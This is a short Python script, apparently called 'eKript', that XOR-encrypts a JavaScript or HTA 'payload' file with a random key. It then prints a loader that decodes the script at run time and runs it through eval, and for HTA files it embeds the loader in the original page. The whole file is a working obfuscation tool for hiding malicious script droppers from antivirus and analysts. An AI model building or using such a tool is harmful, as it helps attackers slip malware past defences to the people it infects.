from itertools import cycle
import random
import os
import sys


def gen_key():
    alphanum = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789"
    return(''.join(random.choice(alphanum) for choice in range(64))) 

def ekript_js(js_source, key):
    crypted = ""


    for(x,y) in zip(js_source, cycle(key)):
        crypted += (str(x ^ ord(y))) + ","
    return crypted[:len(crypted)-1] # Cut off the last "," since im a retard

def make_js_loader_template(crypted_js, key):
    code = ""
    code += """
var data = "{}"
var x = "{}"
""".format(crypted_js, key)
    code += """
function dk(data, x) {
	var d = ""
	data = data.split(",")
	for(var i = 0; i < data.length; i++) {
		d += String.fromCharCode((data[i]) ^ x.charCodeAt(i%x.length))
	}
	return d
}
eval(dk(data, x))
"""
    return(code)
 
def make_hta_loader_template(crypted_js, key, hta_source):
    code = ""
    hta_header = hta_source.split(b"<script>")[0] + b"<script>"
    hta_footer = b"</script>" + hta_source.split(b"</script>")[1]

    code += hta_header.decode('utf-8')
    code += """
var data = "{}"
var x = "{}"
""".format(crypted_js, key)
    code += """
function dk(data, x) {
	var d = ""
	data = data.split(",")
	for(var i = 0; i < data.length; i++) {
		d += String.fromCharCode((data[i]) ^ x.charCodeAt(i%x.length))
	}
	return d
}
eval(dk(data, x))
"""
    code += hta_footer.decode('utf-8')
    return(code)
 
if __name__ == "__main__":
    is_hta = False
    try:
        sys.argv[1]
    except:
        print("eKirmani eKript: xor encryption for JS payloads. Thank you to eKirmani for being a huge inspiration for this project.")
        print("Usage: python3 ekript.py payload.js")
        print("[!] No input file specified. Exiting")
        exit()
    with open(sys.argv[1], "rb") as fd:
        js_source = fd.read()
        raw_source = js_source

    # Defo dealing with an HTA file, not a standard JS file
    if(b"<script>" in js_source and b"</script>" in js_source and b"<html>" in js_source and b"</html>" in js_source):
        is_hta = True
        js_source = js_source.split(b"<script>")[1].split(b"</script>")[0]

    key = gen_key()
    crypted_js = ekript_js(js_source, key)

    if(is_hta):
        print(make_hta_loader_template(crypted_js, key, raw_source))
    else:
        print(make_js_loader_template(crypted_js, key))





